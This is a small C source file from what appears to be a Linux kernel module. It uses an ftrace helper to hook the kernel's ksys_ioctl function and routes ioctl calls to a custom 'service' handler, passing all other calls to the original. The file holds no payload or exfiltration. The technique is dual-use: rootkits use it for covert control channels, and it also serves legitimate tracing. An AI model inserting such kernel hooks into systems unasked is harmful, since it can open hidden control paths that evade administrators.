#include "ftrace_helper.h"
#include "hooks.h"
#include "service.h"

static int (*orig_ksys_ioctl)(unsigned int fd, unsigned int cmd, unsigned long arg);

int hook_ksys_ioctl(unsigned int fd, unsigned int cmd, unsigned long arg)
{
    int rval = handle_ioctl_request(fd, cmd, arg);

    // 0 means this is not a service request
    if (rval == 0)
        return orig_ksys_ioctl(fd, cmd, arg);
    else
        return rval;
}

static struct ftrace_hook hooks[] = {
    HOOK("ksys_ioctl", hook_ksys_ioctl, &orig_ksys_ioctl)
};

inline int register_hooks(void)
{
    return fh_install_hooks(hooks, ARRAY_SIZE(hooks));
}

inline void unregister_hooks(void)
{
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
}